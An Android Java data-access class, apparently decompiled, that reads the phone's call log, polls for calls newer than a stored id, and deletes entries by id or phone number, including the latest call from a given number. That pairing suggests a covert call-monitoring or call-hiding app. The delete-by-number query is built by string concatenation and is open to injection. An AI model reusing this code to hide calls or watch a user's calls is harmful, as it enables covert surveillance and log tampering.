package iits.code.dao;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import iits.code.dto.Call_DTO;
import iits.mamager.FileManager;
import java.util.ArrayList;

public class Call_History_DAO {
    private static final int INCOMING = 1;
    private static final int OUTGOING = 0;
    private static final String TAG = "Call_History_DAO";

    public static ArrayList<Call_DTO> getAlls(ContentResolver cr) {
        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            ArrayList<Call_DTO> arrCall = new ArrayList<>();
            while (c.moveToNext()) {
                Call_DTO call = new Call_DTO();
                call.setID(c.getLong(c.getColumnIndex("_id")));
                call.setTime(c.getLong(c.getColumnIndex("date")));
                call.setNumber(c.getString(c.getColumnIndex("number")));
                if (c.getInt(c.getColumnIndex("type")) == 2) {
                    call.setDirection(0);
                } else {
                    call.setDirection(1);
                }
                call.setDuration(c.getInt(c.getColumnIndex(Call_DAO.KEY_DURATION)));
                arrCall.add(call);
            }
            c.close();
            return arrCall;
        } catch (Exception e) {
            Log.e(TAG, "Error on getAlls function: " + e.toString());
            return null;
        }
    }

    public static int getCount(ContentResolver cr) {
        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int count = 0;
            while (c.moveToNext()) {
                count++;
            }
            c.close();
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getHistory function: " + e.toString());
            return 0;
        }
    }

    public static boolean delete(ContentResolver cr, long id) {
        try {
            if (cr.delete(CallLog.Calls.CONTENT_URI, "_id='" + id + "'", null) == 0) {
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error on deleteCallLast function: " + e.toString());
            return false;
        }
    }

    public static boolean delete(ContentResolver cr, String number) {
        try {
            if (cr.delete(CallLog.Calls.CONTENT_URI, "number='" + number + "'", null) == 0) {
                return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error on delete function: " + e.toString());
            return false;
        }
    }

    public static boolean deleteCallLast(ContentResolver cr, String number) {
        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "_id DESC");
            while (c.moveToNext()) {
                if (c.getString(c.getColumnIndex("number")).equals(number)) {
                    delete(cr, c.getLong(c.getColumnIndex("_id")));
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error on deleteCallLast function: " + e.toString());
            return false;
        }
    }

    public static Call_DTO getLastCall(ContentResolver cr) {
        Exception e;
        Call_DTO call = null;
        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "_id DESC");
            if (c.moveToNext()) {
                Call_DTO call2 = new Call_DTO();
                try {
                    call2.setID(c.getLong(c.getColumnIndex("_id")));
                    call2.setTime(c.getLong(c.getColumnIndex("date")));
                    call2.setNumber(c.getString(c.getColumnIndex("number")));
                    int direction = c.getInt(c.getColumnIndex("type"));
                    if (direction == 1) {
                        call2.setDirection(1);
                    } else if (direction == 2) {
                        call2.setDirection(0);
                    } else {
                        call2.setDirection(1);
                    }
                    call2.setDuration(c.getInt(c.getColumnIndex(Call_DAO.KEY_DURATION)));
                    call = call2;
                } catch (Exception e2) {
                    e = e2;
                    FileManager.WriteLog(3, TAG, "Error on getCallLast function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return call;
        } catch (Exception e3) {
            e = e3;
            FileManager.WriteLog(3, TAG, "Error on getCallLast function: " + e.toString());
            return null;
        }
    }

    public static Call_DTO getCallNew(ContentResolver cr, long id) {
        Exception e;
        Call_DTO call = null;
        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, "_id > ?", new String[]{String.valueOf(id)}, "_id");
            if (c.moveToNext()) {
                Call_DTO call2 = new Call_DTO();
                try {
                    call2.setID(c.getLong(c.getColumnIndex("_id")));
                    call2.setTime(c.getLong(c.getColumnIndex("date")));
                    call2.setNumber(c.getString(c.getColumnIndex("number")));
                    int direction = c.getInt(c.getColumnIndex("type"));
                    if (direction == 1) {
                        call2.setDirection(1);
                    } else if (direction == 2) {
                        call2.setDirection(0);
                    } else {
                        call2.setDirection(1);
                    }
                    call2.setDuration(c.getInt(c.getColumnIndex(Call_DAO.KEY_DURATION)));
                    call = call2;
                } catch (Exception e2) {
                    e = e2;
                    FileManager.WriteLog(3, TAG, "Error on getCallNew function: " + e.toString());
                    return null;
                }
            }
            c.close();
            return call;
        } catch (Exception e3) {
            e = e3;
            FileManager.WriteLog(3, TAG, "Error on getCallNew function: " + e.toString());
            return null;
        }
    }
}
